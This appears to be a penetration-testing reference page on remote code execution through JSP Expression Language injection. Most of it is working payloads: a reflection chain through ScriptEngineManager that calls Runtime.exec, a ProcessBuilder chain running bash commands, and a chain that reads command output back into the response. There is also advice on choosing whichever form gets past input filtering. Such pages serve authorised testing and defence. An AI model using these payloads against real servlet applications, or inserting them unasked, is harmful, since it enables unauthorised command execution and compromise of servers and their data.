---
title: "JSP EL code execution: reflection to ProcessBuilder through unified EL"
description: "JSP unified EL from 2.2 onward invokes methods, so an injected ${...} expression reaches reflection, a script engine, or ProcessBuilder to run commands inside the servlet container."
keywords:
  - JSP EL code execution
  - unified EL method invocation
  - ScriptEngineManager EL
  - ProcessBuilder reflection
  - EL RCE
---

# Code execution

Method invocation entered the unified EL at the 2.2 revision, which is the baseline on any modern servlet container. Once an EL expression calls methods, a literal becomes the start of a reflection chain: `getClass()` on any object yields a `Class`, `forName(...)` loads an arbitrary type, and the loaded type is instantiated and driven through its methods. EL has no `new` on a named type and no `import`, so the host runtime is always reached through reflection rather than a direct type reference.

## Script engine route

Running a scripting language through `javax.script` is the shortest path. An empty string literal gives a `String`, `getClass()` gives its `Class`, and `forName` loads the `ScriptEngineManager`, whose JavaScript engine evaluates arbitrary Java:

```jsp
${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')}
```

`newInstance()` succeeds because `ScriptEngineManager` has a public no-argument constructor. The JavaScript engine (Nashorn) ships with the JDK through version 14, so this route depends on the runtime bundling it or on another JSR-223 engine being on the classpath.

## Reflection to ProcessBuilder

Where no script engine is available, the expression reaches `ProcessBuilder` directly. It has a varargs `String...` constructor, so one declared constructor is instantiated with the command array and started:

```jsp
${''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance(['/bin/bash','-c','id; uname -a']).start()}
```

Index `[0]` assumes the first declared constructor is the array form; if the ordering differs on a given JDK, iterate the constructor array and select the one whose parameter type matches. `ProcessBuilder` runs the program without a shell, so `;`, pipes, and redirection belong inside the `bash -c` string, not around it.

## Reading output back

To bring command output into the response instead of running blind, drain the process stream in the same expression:

```jsp
${''.getClass().forName('java.util.Scanner').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id').getInputStream()).useDelimiter('\\A').next()}
```

The `Runtime` form (`getMethod('getRuntime').invoke(null).exec(...)`) and the `ProcessBuilder` form are interchangeable; choose whichever survives the filtering in front of the sink.

## Tools

- **Burp Suite**: Repeater to deliver ${...} reflection payloads and read output.
- **J2EEScan**: Burp extension that flags Java EL injection.
- Manual unified-EL reflection to ScriptEngineManager or ProcessBuilder.

## References

- [Jakarta Expression Language Specification](https://jakarta.ee/specifications/expression-language/)
- [PayloadsAllTheThings: Java EL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
